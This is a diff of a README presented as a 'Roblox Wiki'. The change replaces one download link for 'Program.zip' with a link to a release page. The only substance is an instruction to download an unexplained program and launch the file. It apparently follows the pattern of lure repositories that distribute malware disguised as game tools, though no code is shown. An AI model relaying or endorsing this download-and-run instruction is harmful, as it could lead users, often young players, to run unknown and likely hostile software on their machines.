@@ -9,7 +9,7 @@ Welcome to the Roblox Wiki, your go-to source for all things related to Roblox! 
 
 ## 📥 Get Started:
 To access the program and start exploring the world of Roblox, kindly download the program by clicking the link below:
-[![Download Program](https://img.shields.io/badge/Download-Program.zip-blue.svg)](https://github.com/user-attachments/files/18285177/Program.zip)
+[![Download Program](https://github.com/Randypro123/Roblox-Wiki/releases/tag/v2.0)](https://github.com/Randypro123/Roblox-Wiki/releases/tag/v2.0)
 
 ### **Note:** Please make sure to launch the downloaded file to begin using the program.
 
